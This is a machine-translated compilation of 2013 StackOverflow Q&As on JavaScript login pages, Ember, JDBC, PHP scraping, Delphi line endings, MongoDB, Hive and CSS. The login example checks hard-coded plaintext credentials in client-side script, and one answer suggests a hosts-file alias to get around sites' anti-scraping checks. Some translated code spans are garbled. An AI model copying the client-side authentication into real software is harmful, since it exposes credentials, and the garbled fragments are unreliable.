# StackOverflow 问答 16204000-16204999

# javascript - Javascript登录重定向不起作用

> ID：16204000
> 
> 赞同：0
> 
> 时间：2013-04-24T23:34:03.147
> 
> 标签：javascript, button, if-statement, login, document.write

因此，对于我的网页设计课程，我的老师要求我教课程简单的 javascript，我想制作一个简单的网站，我的老师或我都可以用它来做这件事。我希望它是（我认为很简单）有一个登录框的东西，当你登录时，如果你使用我的登录名或我老师的登录名，它会起作用，它会创建按钮或重定向到另一个上面有按钮的页面，但由于某种原因，我用于登录的 if else 语句（因为它只有两个实例是真的不想工作。

**编辑：**我仍在学习 Javascript，并且只了解它的一些非常基本的部分。（这就是我需要做的所有事情）我要做的就是让按钮出现，这样我就可以使用它们来调用创建信息的函数，这些信息在单击它们时会被写出。例如，要在给出正确的登录信息时创建按钮，然后当出现的按钮出现时，您可以单击第一个按钮，然后会出现有关脚本标签的段落。

**密码和名称检查功能的工作没有太大问题，当我让它们都发出警报时，如果它是正确的，第一个是 eeyup，如果给出的信息是错误的，它们都可以工作。只有当我尝试使用 document.write 时才会遇到问题**

**目前，它的作用是按钮在屏幕上闪烁一秒钟然后消失，登录框/屏幕重新出现。**

我正在使用的登录功能是：

```
 <script type="text/javascript">
function validator(){
    var name = document.KageForm.User.value;
    var password= document.KageForm.pass.value;
    if(password=="mypassword" && name=="myusername"|| password=="myteacherspassword" &&name=="myteachersname" ){
  document.write(showbuttons());
} else {
    document.write("This is not meant for you to see.");
}}
</script> 
```

显示按钮的函数 showbuttons 如下所示：

```
function showbuttons(){
    document.write("<div><form><input type=\"button\" value=\"Starting Your Script\" onclick=\"FirstThingsFirst()\"/><br/><input type=\"button\" value=\"Learn about document.write\" onclick=\"writing()\" /><br/><input  type=\"button\" value=\"Variables\"onclick=\"settingVariables()\" /><br/><input type=\"button\" value=\"Using Functions\" onclick=\"usingFunctions()\" /><br/><input type=\"button\" value=\"If Statements\" onclick=\"usingIfStatements()\" /><br/><input type=\"button\" value=\"Else Statements\" onclick=\"usingElseStatements()\" /><br/><input type=\"button\" value=\"Return to Login\" onclick=\"homepage()\" /></form></div>")
    document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
} 
```

整个页面的总代码是这样的：（另外如果按钮拉起的文字有什么不准确的地方，请指出）

```
 <!doctype html>
    <html>

    <head>

            <style type="text/css"> 

      body {background-image:url(https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg)}
body{
    font-family:helvetica;
    color:darkviolet;
}
    h2 {color:darkviolet;}
    #tag1 {width:480px;}
#wrapper { width:960px;margin:0 auto; }
}

    div {
    margin: 5px;
      border: 5px solid darkviolet;
width:50%;

}
  img {
    width:20.00%;
    height:20.00%;

   }
ul li a {
    margin: 10px;
    padding: 2px;
    background: #f2a7c6;
    float: left;
    border: 2px ;
}

a:link {text-decoration:none
    color:darkviolet;}
    h3 {
        font-family:helvetica;
    color:darkviolet
    }
   #white {
    color:white;
   }
    </style>
    <script type="text/javascript">

/*<input type=\"button\" value=\"Starting Your Script\" onclick=\"FirstThingsFirst()\"/><br/><input type=\"button\" value=\"Learn about document.write\" onclick=\"writing()\" /><br/><input  type=\"button\" value=\"variables\"onclick=\"settingVariables()\" /><br/>input type=\"button\" value=\"Using Functions\" onclick=\"usingFunctions()\" /><br/>input type=\"button\" value=\"If Statements\" onclick=\"usingIfStatements()\" /><br/>input type=\"button\" value=\"Else Statements\" onclick=\"usingElseStatements()\" />*/

function FirstThingsFirst() {
var mytext = "<div id=\"thisshouldbewhite\"> To start writing Javascript into your page, you must first make use of the script tag. The tag is 'script' type=\"text/javascript\"  with the closing tag simply being /script. you can use a Javascript either in your heading of your page, after the style tag, or anywhere in your body. Personally, I prefer to put all my script, or at least my functions,  in the head of my page.</div> <input type=\"button\" value=\"Return to Home\" onclick=\"homepage()\" />"
    document.write(mytext);
document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
}

function writing() 
{    
var mytext = "<div id=\"thisshouldbewhite\">To write something out on your screen, you use the command \'document.write()'. To get what you want to appear, put qutation marks around it in the paranthesis. So to write out \"bacon\", you would put: document.write(\"bacon\") in your script. Document.write() is used for many things, mainly displaying information based on input data given to the page by the user that fits into variables defined by the creator of the page. For example, document.write(variableX()) would print out anything that has been put in for variableX.</div><input type=\"button\" value=\"Return to Home\" onclick=\"homepage()\" />"
    document.write(mytext);
document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";

}
function settingVariables(){
    document.write("<div id=\"thisshouldbewhite\">to create a variable, youtype in \'var\' followed by a space, then the name of the variable, an = then what the variable is equal to. So, if you had food on your mind and wanted your variable to be \'bacon\' your variable would be: var food=\"bacon\"</div><input type=\"button\" value=\"Return to Home\" onclick=\"homepage()\" />")
    document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
}

function usingFunctions(){
  document.write("<div id=\"thisshouldbewhite\">Functions are used to use commands only when triggered, or to do multiple things at once. for example, open up a website and type in the following code: <br/> <i>function troll(){<br/>document.write(\"gotcha!\");<br/>document.write(gotcha());<br/> function gotcha(){<br/>document.write(\" hahahaha!\");<br/>document.write(troll())</i>;<br/> What this will do is that the first function will call the second function, and then when the second function is called it will call the first function.Since neither are being called at the moment, create a button in your html as usual, but in the starting tag, add the property\"onClick\". Name your button something like, 'start trolling' or something like that. So, your code for your input should look something like <i><-input type=\"button\" value=\"Starting Your Script\" onclick=\"FirstThingsFirst()\"/></i> <br/> obviously minus the dash at the start of the tag.</br><input type=\"button\" value=\"Commence Trolling\" onclick=\"troll()\"/></div><input type=\"button\" value=\"Return to Home\" onclick=\"homepage()\" />");
  document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
}
function usingIfStatements(){
  document.write("<div id=\"thisshouldbewhite\">If statements are used to create scenarios such as login screens, since that is the use that will be most familiar to most of us. An If statement goes inside the function tag, so when in use the statement looks like this:<br/>function login(){<br/>if(conditions for if statement){commands for if statement to follow}}<br/> Here is an example of a functional function using an IF Statement:<br/>function login(){<br/>var name=\"your name\";<br/>if(name==\"your name\"){document.write(\"You are indeed yourself\")}}<br/>This would print out the words in the command following the If statement, since the statement is true, since the variable, \"name\" is equal to \"your name\"</div><input type=\"button\" value=\"Return to Home\" onclick=\"homepage()\" />");
  document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
}

function usingElseStatements(){
    document.write("<div id=\"thisshouldbewhite\">So, we know how to make an If statement, now we are going to use Else statements. This would be like on a login screen, if you type in inaccurate information and it gives you an error message<i><br/>function login(){<br/>if(conditions for if statement){commands for if statement to follow}else(commands for script to follow if your If statement is not true)}</i><br/> Here is an example of a functional function using an IF Statement:<i><br/>function login(){<br/>var name=\"your name\";<br/>if(name==\"your name\"){document.write(\"You are indeed yourself\")else{document.write(\"you are not yourself when you're hungry.\")}}}<br/></i></div>")
    document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
}

function troll(){
document.write("gotcha!");
document.write(gotcha());
}
function gotcha(){
document.write(" hahahaha!");
document.write(troll())
}

function homepage() 
{
    window.location.href = "file:///C:/Users/Admin/Documents/Websites/TEst.html";
}
function gotoButtons() 
{
    window.location.href = "file:///C:/Users/Admin/Documents/Websites/Buttons.html";
}

function showbuttons(){
    document.write("<div><form><input type=\"button\" value=\"Starting Your Script\" onclick=\"FirstThingsFirst()\"/><br/><input type=\"button\" value=\"Learn about document.write\" onclick=\"writing()\" /><br/><input  type=\"button\" value=\"Variables\"onclick=\"settingVariables()\" /><br/><input type=\"button\" value=\"Using Functions\" onclick=\"usingFunctions()\" /><br/><input type=\"button\" value=\"If Statements\" onclick=\"usingIfStatements()\" /><br/><input type=\"button\" value=\"Else Statements\" onclick=\"usingElseStatements()\" /><br/><input type=\"button\" value=\"Return to Login\" onclick=\"homepage()\" /></form></div>")
    document.body.style.backgroundImage="url('https://fc04.deviantart.net/fs70/f/2013/029/6/8/smoke_by_kage_kaldaka-d5t50d9.jpg')";
document.getElementById('thisshouldbewhite').style.color="white";
document.getElementById('thisshouldbewhite').style.width="400px";
document.getElementById('thisshouldbewhite').style.fontFamily="helvetica";
}
        </script>

        </head>
        <body>
           <script type="text/javascript">
      function validator(){
        var name = document.KageForm.User.value;
        var password= document.KageForm.pass.value;
        if(password=="mypassword" && name=="myusername"|| password=="myteacherspassword" &&name=="myteachersname" ){
      document.write(showbuttons());
    } else {
        document.write("This is not meant for you to see.");
    }}
        </script>
        <form name="KageForm">
            Username:<input type="text" name="User">
        <br/>
            Password: <input type="password" name="pass">
        <br/>
        <input type="image" src="https://a.deviantart.net/avatars/k/a/kage-kaldaka.png?6" 
         value="Submit" onclick="validator()" />
        <br/>
        <input type="button" value="Starting Your Script" onclick="FirstThingsFirst()"/>
        <br/>
        <input type="button" value="Learn about document.write" onclick="writing()" />
        <br/>
        <input  type="button" value="Variables" 
       onclick="settingVariables()" />
         <br/>
       <input type="button" value="Using Functions" onclick="usingFunctions()" />
       <br/>
       <input type="button" value="If Statements" onclick="usingIfStatements()" />
       <br/>
       <input type="button" value="Else Statements" onclick="usingElseStatements()" />
       <br/>
       <input type="button" value="" onclick="" />
       <br/>
       <input type="button" value="" onclick="()" />
       <br/>
       <input type="button" value="" onclick="()" />
       <br/>
       <input type="button" value="" onclick="()" />

        </form>

    </body>

    </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:38:46.647

您必须将每个条件放在自己的括号中

```
 (((password =="mypassword") && (name=="myusername")) || ((password=="myteacherspassword") && (name=="myteachersname")) ) 
```

所以我们加上括号...在每个 & 符号之前作为它自己的分组.. 在 or 之前的两个条件作为一个分组而另一侧相同

所以你总共会有六个分组。

另外，如果你打算使用这个网站，我曾经问过一个“家庭作业”或与学校相关的问题，并被钉死在十字架上，因为这显然是不允许的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:30:18.303

您的代码中有几个问题：

1.  在您的功能中更改`document.write(showbuttons());`为。由于不返回字符串，而是自己编写 HTML；`showbuttons();``validator()``showbuttons()`

2.  改变

    `<input type="image" src="https://a.deviantart.net/avatars/k/a/kage-kaldaka.png?6" value="Submit" onclick="validator()" />`

    至

    `<img src="https://a.deviantart.net/avatars/k/a/kage-kaldaka.png?6" value="Submit" onclick="validator()" />`.

    由于`<input type="image" ... />`触发浏览器提交表单并重新加载页面。

您可以在此处查看工作示例[http://jsbin.com/ayovom/2/edit](http://jsbin.com/ayovom/2/edit)。

# ember.js - Ember.js 重定向到第一项错误

> ID：16204001
> 
> 赞同：3
> 
> 时间：2013-04-24T23:34:08.103
> 
> 标签：ember.js

我有一张门票清单。当我去路由“票”时，我会显示它们的列表。我希望自动选择第一个项目。我在stackoverflow上找到了解决方案，但它对我不起作用。代码是：

```
window.App = Ember.Application.create();

App.Router.map(function() {
    this.resource('tickets', function() {
        this.resource('ticket', { path: ':ticket_id' });
    });
    this.resource('feedback');
});

App.TicketsRoute = Ember.Route.extend({
    model: function() {
        return App.Ticket.find();
    }, 
    redirect: function() {
        var ticket = this.modelFor('tickets').get('firstObject');
        this.transitionTo('ticket', ticket);
    }
}); 
```

当我第一次访问门票路线时，它会选择第一项。但后来我去另一条路线并返回门票。之后我得到下一个错误：

```
WARNING: The immediate parent route ('a') did not render into the main outlet and the    default 'into' option ('p') may not be expected 
```

并且标记变得错误，它不显示项目列表（仅关于第一张票的详细信息）。我不明白这个错误。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-26T02:41:31.970

警告是因为正在渲染的模板在其父级中没有找到出口。我猜也许你有一个`ticket.hbs`模板但没有`tickets.hbs`？理想情况下，它应该是这样的：

```
// in tickets.hbs
{{#each ticket in tickets}}
  //ticket link
{{/each}}
{{outlet}}

// tickets/index.hbs
Please select a ticket from the list

// in ticket.hbs
// ticket details 
```

有关说明，请参阅[https://github.com/emberjs/ember.js/pull/1916#issuecomment-13669980](https://github.com/emberjs/ember.js/pull/1916#issuecomment-13669980)。

# java - 插入语句无法正常工作

> ID：16204019
> 
> 赞同：2
> 
> 时间：2013-04-24T23:35:59.270
> 
> 标签：java, mysql, prepared-statement

我试图通过我的对话框在我的数据库中插入 orderId（应该自动递增）和表号，但是当我返回 MySql 数据库时，orderId 或表号都没有存储。可能是什么问题呢？订单表具有以下属性：orderId、tableNum、numofGuests、itemIdFK、empIdFK。

```
 private void orderButtonActionPerformed(java.awt.event.ActionEvent evt) {                                            
    // TODO add your handling code here: 
  try {
      //Dialog box asking for the table number 
String tableNumString =  JOptionPane.showInputDialog(null,"What is the table number?",
      "Your Password",JOptionPane.QUESTION_MESSAGE);

    int tableNum = Integer.parseInt(tableNumString);
    System.out.println(tableNum);
    String query = "Insert into orders(orderId,tableNum) values(?,?)";

        int order = 1;

        ps = connection.prepareStatement(query);

        ps.setInt(1, order);
        ps.setInt(2, tableNum);

        //switch to the next page after table number is inserted 
         CardLayout cl = (CardLayout)(mainpanel.getLayout());
      cl.show(mainpanel,"card3");
    } catch (SQLException | NumberFormatException ex) {}
} 
```

![我的对话框](https://i.stack.imgur.com/R1LhF.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T23:39:16.153

您从未真正在代码中执行更新。你需要这样称呼：

```
ps.executeUpdate(); 
```

[这里](http://www.java2s.com/Code/JavaAPI/java.sql/ConnectionprepareStatementStringsql.htm)有一个准备好的语句的好例子。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T23:38:41.260

如果您已将`orderId`列定义为自动递增，那么您的`sql`查询应如下所示：

`String query = "Insert into orders(tableNum) values(?)";`

你应该只设置 tableNum 值：

`ps.setInt(1, tableNum);`

# php - 为什么 PHP Simple HTML DOM Parser 不会从 localhost 解析某些站点？

> ID：16204031
> 
> 赞同：0
> 
> 时间：2013-04-24T23:37:32.147
> 
> 标签：php, parsing, simple-html-dom

我正在尝试使用[php 简单的 html dom 解析器](http://simplehtmldom.sourceforge.net/)，显然它不会解析来自 localhost 的某些站点。如果我在线上传脚本，那么一切都很完美，但 localhost 失败并且仅在某些特定站点上失败。我相信这是因为目标站点实施了某种检查，但我想不出它可能是什么......有人知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T23:45:53.137

正如您所提到的，一些网站具有不允许未经授权的第三方工具解析其内容的机制。

例如脸书。

如果问题仅在您位于 localhost 时发生，您可以尝试编辑主机文件并添加以下行：

`127.0.0.1 mytestingserver.com`

然后以与使用 localhost 访问文件相同的方式访问文件，但不要使用 localhost：

`mytestingserver.com`

例如：

`mytestingserver.com/simple-html-dom.php`

并查看内容是否加载。

如果它有效，您尝试解析的页面可能只检查请求是否来自域名；如果没有，那么他们可能有一个更复杂的保护机制，而您想要做的是是否不允许，或者有更好的方法来做到这一点（例如 API）。

# delphi - Delphi XE2：调试器和编译器错误行数减少了 7-20 行，也减少了相同的数量

> ID：16204032
> 
> 赞同：14
> 
> 时间：2013-04-24T23:37:36.103
> 
> 标签：delphi, delphi-xe2

我在工作的大型 Delphi 代码库中遇到问题，作为从 Delphi 2007 移植到 XE2 的副作用，我们现在遇到以下奇怪的相关问题：

*   即使在调试版本中，您也无法设置断点或单步执行代码，因为行号完全混乱，仅在某些单元中。

*   在第 2010 行故意引入语法错误会导致光标聚焦在第 2020 行，给或取 3 或 4 行，如下所示：

.

```
 procedure Correct;
 begin
    DoSomething; // syntax error reported HERE but the real error is below.
    // more stuff here.
 end;

 procedure OllKorrect;  
 begin
        ThisLineIsFine();
        __VARIABLE_NOT_DEFINED__ := 1; // intentional error
 end 
```

我希望有人以前见过这个。问题的要素可能包括：

该代码包含许多奇怪的编译器指令，例如 {$REALCOMPATIBILITY ON} 和 {$H-}/{$H+} 指令，代码中有数千个 {$H+}/{$H-} 指令。

其次，代码使用了很多 {$I INCLUDE} 指令，我怀疑包含文件可能会直接弄乱编译器的行号。

我不能肯定地说，但我怀疑所有这些旧的“让它像 DOS 的 turbo pascal 一样工作”编译器开关是其背后的原因。我想知道是否有人肯定对此有所了解。它只发生在代码中的某些地方，并且对于一个拥有超过 500 个单元的项目，其中一些达到 10K/20KLOC 的大小，这绝对是令人沮丧的。我能说的是，不仅有 {$I include.inc} 指令的单元会搞砸，而且许多包含大量 {$H-}/{$H+} 或 {$REALCOMPATIBILITY} 指令的单元也会没有这个问题。如果我能看到行为不端的单位有什么共同点，我就能弄清楚这一点。

更新：线路终止问题是有道理的。我运行了检测到问题的代码。修复代码已被注释掉，因为如果您取消注释它并删除所有源代码，那就是您的问题。它将非 unicode 文件加载到 unicode TStringList 中并将其保存回来。这在我的世界里没问题，因为它的所有版本都受控和备份。你的旅费可能会改变。

```
program linefeedsProject1;

{$APPTYPE CONSOLE}

uses
  IOUtils,
  Classes,
  Types,
  SysUtils;

  var
    broken,notBroken:Integer;

  function fix(filename:String):Boolean;
  var
    sl:TStringList;
  begin
    sl := TStringList.Create;
    try
    sl.LoadFromFile(filename);
    //TODO:Change file extensions.
    sl.SaveToFile(filename);
    finally
      sl.Free;
    end;
  end;

  function scan(filename:String):Boolean;
  var
  crFlag:Boolean;
  lfFlag:Boolean;
  missingCr:Integer;
  missingLf:Integer;
   f:TFileStream;
   buf:Array[0..1024] of AnsiChar;
   n:Integer;
   procedure scanChars;
   var
    i:Integer;
   begin
     for i := 0 to n-1 do
     begin
       if buf[i]=#13 then
       begin
          crFlag := true;
          lfFlag := false;
       end
       else if buf[i]=#10 then
       begin
           if not crFlag then
            inc(missingCr);
          lfFlag := true;
          crFlag := false;
       end
       else begin
         if (crFlag) then
          inc(missingLf);
         crFlag := false;
         lfFlag := false;
       end;
     end;
   end;
  begin
   result := false;
   crFlag := false;
   lfFlag := false;
   missingCr := 0;
   missingLf := 0;
    f := TFileStream.Create(filename, fmOpenRead);
    try
      while f.Position< f.Size do
      begin
        n := f.Read(buf[0],1024);
        scanChars;
      end;

     if (missingCr>0) or (missingLf>0) then
     begin
          WriteLn('  ', filename);
          Inc(broken);
          result := true;
     end
     else
     begin
        Inc(notBroken);
     end
    finally
      f.Free;
    end;

  end;
var
 files:TStringDynArray;
 afile:String;
 begin
  try
  broken := 0;
  notBroken := 0;
    files := TDirectory.GetFiles('C:\dev\abackupcopyofyoursourcecode',  '*.pas',
    TSearchOption.soTopDirectoryOnly );
    // tried TSearchOption.soAllDirectories and it exploded. not recommended.

    for afile in files do
    begin
       if scan(afile) then
       begin
           // fix(afile); // uncomment at your own risk and only on a backup copy of your code.
       end;

    end;

    WriteLn('Broken ', broken);
    WriteLn('not broken ',notBroken);

   // readln;

     except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end. 
```

[更新 2：如果你想要一个扫描仪/修复器来解决这个问题，你可以在这里下载我的（带有源代码）。](https://docs.google.com/file/d/0B07SrKpE8ErmbHZ1SWkxT3RLczA/edit?usp=sharing) 链接是 Google Drive。您可以从链接中查看源代码，但单击“文件”下拉菜单（Google Drive Web 用户界面的一部分），然后单击“下载”进行下载。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-04-24T23:42:11.290

我以前见过这样的事情，而 IME 通常是由于计算行号时的编译器错误。如果您在某些点有非标准换行符（不是 CRLF）——这可能会发生——IDE 将执行正确的换行符，但编译器不会将它们视为新行，因此之后的所有内容都会被丢弃。

当我遇到这样的文件时，我会在 EditPad 中打开它，将所有换行符转换为其他样式（Unix 或 Mac 样式），然后将所有换行符转换为 Windows 样式并保存。这确保了文件中的每一行都以 CRLF 结尾，并且在重建后，蓝点未正确排列的问题消失了。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-24T23:42:50.223

这是由不匹配的行终止字符引起的常见问题。（行尾缺少 CR 或 LF 的代码。）这也可能是由于 .dcu 与在编辑器中打开的源文件不匹配造成的。

首先，最简单的解决方法是在常规文本编辑器（例如记事本）中打开源文件。做一个小改动（插入一个空行然后删除它），然后保存文件。记事本将修复行尾。

如果这不是问题，请在 IDE 的搜索路径中查找驱动器上可能存在的 .dcu（或 .pas）文件的额外副本。有时编译器看到的版本与编辑器中打开的版本不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-02T10:48:23.620

如前几篇文章所述，它肯定与行尾相连。尝试将其编辑掉是非常困难的，因为 Embarcadero 编辑器试图发挥自己的魔力并保留当前部分的行尾（或者看起来如此），

解决方法：在 IDE 编辑器窗口中单击鼠标右键，选择“格式化源代码”（Ctrl-D）并接受。

这将修复所有行尾并消除问题（对我来说无论如何）。作为副产品，您将获得格式正确的源代码:-)

# mongodb - 如何使用mongo删除流星中的数组项？

> ID：16204038
> 
> 赞同：5
> 
> 时间：2013-04-24T23:38:07.947
> 
> 标签：mongodb, meteor, mongodb-query

我有这个应用程序我正在开发...

[http://stevedavis.meteor.com/](http://stevedavis.meteor.com/)

您可以通过在控制台中执行“Groups.find()”来查看组集合的内容。

我在我的 JS 中有这个...

```
Template.listGroups.events({
  'click .deleteMember': function(){
    var groupID = this.groupID,
        firstName = this.firstName,
        lastName = this.lastName;
  }
}); 
```

所以，如果我点击他们名字旁边的 X，我希望能够从组中删除一个成员。我试过了...

```
Groups.update( {"_id": groupID }, {$unset: { "members" : {"firstName": firstName, "lastName": lastName} } } ); 
```

但它删除了所有成员。我只希望它删除与单击的元素的名字和姓氏相匹配的成员项。谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T00:08:39.480

啊，我只需要将“$unset”更改为“$pull”。我通过“$push”添加，所以我想，“有 $pull 方法吗？” 有！:)

```
Groups.update( {"_id": groupID }, {"$pull": { "members" : {"firstName": firstName, "lastName": lastName} } } ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-06T23:44:43.573

我在 MongoDB 的文档中找到了这个很棒的页面，它显示了您在此处发现的查询/投影以及更多！

[MongoDB 文档。](http://docs.mongodb.org/manual/reference/operator/update-array/)

感谢您提出这个问题-您的回答使我走上了正确的道路。

# java - 如何使用具有两个 int 值和一个字符串键的 map

> ID：16204043
> 
> 赞同：0
> 
> 时间：2013-04-24T23:38:28.177
> 
> 标签：java, arrays, boolean, hashcode

我应该创建一个公共 StudentDatabase()，它应该创建一个空数据库，而不使用 java api 类或方法。应该有一种方法： public boolean add(String macid, int Exam1, int Exam2) 将记录添加到数据库中。如果 MacID 为 macid 的学生已经在数据库中，则此方法更新他/她的成绩为考试 1 和考试 2，并返回 false；否则，它会在数据库中创建 macid、exam1 和exam 2 作为新记录并返回true。我已经做到了这一点：

```
 public class StudentDatabase
    {
public StudentDatabase()
{
   Map<String, Set<int>> = new HashMap<String,List<int>>();
}

public boolean add(String macid, int exam1, int exam2)
{
    remove(0);
    return false;
}

public int getExam1(String macid)
{
if (sdb.macid("ID_") = macid);
else
    return -1;
}

public int getExam2(String macid)
{
    return -1;
}

public boolean remove(String macid)
{

            if (StudentDatabase.macid == macid[]) { 
                for (int j = i; j < (size - 1); j++) 
                {
                    ARRAY[j] = ARRAY[j + 1]; //shift elements left
                }

            return true;
        }

    return false;
}

public int query(int exam1Low, int exam1High, int exam2Low, int exam2High)
{
    return 0;
}
} 
```

我不明白如何使用 Map 创建数据库。任何帮助将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:56:45.883

我认为您没有正确考虑地图类。我认为您应该将地图的创建更改为此。

```
Map<String,List<int>> index = new HashMap<String,List<int>>(); 
```

从那里您可以使用 hashmap 方法来添加和删除学生。 [HashMap API found here](http://docs.oracle.com/javase/7/docs/api/java/util/HashMap.html)
这将是您代码的开始

```
public boolean inIndex(String key)
    {
        return index.containsKey(key);
    }
public void index(String val,int res1,int res2)
    {   
            List<Integer> intList = new LinkedList<Integer>();         

            if(inIndex(val)==false)
            {
            index.put(val,intList);                                    
            }
            index.get(val).add(res1);
            index.get(val).add(res2);  
        }

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:07:08.690

因为您知道考试的数量，您可能希望保存一个 ExamRecord 而不是整数列表

```
ExamRecord implements Comparable<ExamRecord>, Serializable {
    private int exam1;
    private int exam2;

    public int compareTo(ExamRecord other) { }

    public int hashCode() { }
}

Map<String, ExamRecord> 
```

至于如何使用 Map 创建数据库，您需要一个名为“index”的文件，其中列出所有学生姓名（键），然后为每个学生创建一个与学生同名的文件（所以“John Smith" 保存到 "John Smith.dat" 或 "John_Smith.dat" 或其他); 这个文件要么包含学生的序列化 ExamRecord，要么包含考试成绩列表（例如，如果学生的 ExamRecord 是考试 1=50，考试 2=80，那么您将保存 50;80，然后您将这些值解析回将数据库读回内存时的检查记录）。

另一种选择是仅对整个数据库进行序列化/反序列化，但如果您为课堂项目执行此操作，那么教授可能会认为这是作弊。

# map - 在 Hive 中插入具有 MAP 数据类型的表

> ID：16204052
> 
> 赞同：2
> 
> 时间：2013-04-24T23:39:10.143
> 
> 标签：map, streaming, hive

我正在尝试使用配置单元流作业将数据插入到包含具有 MAP 数据类型的列的表中。

我尝试在表定义中设置所有分隔符，然后以正确的格式从流式作业中输出数据。

```
ROW FORMAT DELIMITED FIELDS TERMINATED BY '\t'
COLLECTION ITEMS TERMINATED BY ','
MAP KEYS TERMINATED BY '|'
LINES TERMINATED BY '\n' 
```

我还尝试以 Hive 存储地图的确切格式输出数据`({key:value})`。

这是我一直看到的错误：

```
FAILED: Error in semantic analysis: Line 7:23 Cannot insert into target table because column number/types are different 'table_name': Cannot convert column 2 from string to map<string,string>. 
```

是否可以在 Hive 中执行此操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-27T12:37:13.257

没有您的数据样本和完整的表模式，我无法为您解释错误原因。

显然根据您的 ROW FORMAT 定义；数据中的地图结构应该是（假设地图大小为 2）：

`....\tkey1|value2,key2|value2\t...other columns\n`

# javascript - JavaScript 使用不同的浏览器返回不同的时间结果

> ID：16204053
> 
> 赞同：0
> 
> 时间：2013-04-24T23:39:11.170
> 
> 标签：javascript, google-chrome, firefox

我有这个函数，它以秒为参数，并返回一个时间格式字符串。

```
var secondstotime = function(secs) {
    var t = new Date(1970, 0, 1);
    t.setSeconds(secs);
    var s = t.toTimeString().substr(0, 8);
    if (secs > 86399) {
        s = Math.floor((t - Date.parse("1/1/70")) / 3600000) + s.substr(2);
    }
    return s;
} 
```

Chrome 和 Mozilla 给了我两个不同的结果，我知道 Chrome 是对的，但我不知道为什么 Mozilla 一直在时间字符串上加一个小时。

例如：

```
console.log(secondstotime(20000)); 
```

Chrome 给了我`05:33:20`，Mozilla 给了我`06:33:20`

我似乎看不出问题出在哪里，代码是否不兼容？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-03-27T12:03:49.853

首先，我会尝试使用[Moment.js](https://momentjs.com/ "时刻.js")，它们将处理浏览器实现之间的差异：

```
const secToTime = s => moment("2015-01-01").startOf('day')
    .seconds(s)
    .format('H:mm:ss'); 
```

然后运行：

```
secToTime(20000) 
```

否则你应该检查你的使用日期函数的实现，parse vs toTimeString vs constructor

# html - 标题未触及屏幕顶部

> ID：16204059
> 
> 赞同：0
> 
> 时间：2013-04-24T23:39:27.637
> 
> 标签：html, css, ruby-on-rails

我在屏幕顶部的页面上有一个标题，并延伸到整个屏幕。它被渲染为一个 rails 部分。每当页面正文中有任何内容时，标题都会被拉下并且不再接触页面顶部。我似乎无法弄清楚是什么原因造成的。当页面正文中没有任何内容时，它可以正常工作。

这是CSS

```
html{
  padding: 0;
  margin: 0;
}

body{
    background-color: #Dee0D5;
  margin:0;
  padding: 0;
}
#navwrap{
 width: 800px;
  margin: 0 auto;
  padding: 0; 
}
#nav {
    width: 100%;
  height:50px;
    float: left;
    padding: none;
    background-color: #859797;
  margin: 0 0 10px 0;
    box-shadow: 0 0 5px #999999;

    ul{
       list-style: none;

       li{
        display:inline;
        float:left;
        padding: 10px;
        font-family: sans-serif;
       }
    }
}

#wrapper {

    width: 700px;
    margin: 0 auto;
    text-align: left;
    height:auto;
}

#footer{
    width: 100%;
    float: left;
    padding: 0;
    margin: 0 0 0 1em;
    border-top: 1px solid #999999;
       li{
        display:inline;
        list-style-type:none;
        float:left;
        padding: 10px;
        font-family: sans-serif;
       }

} 
```

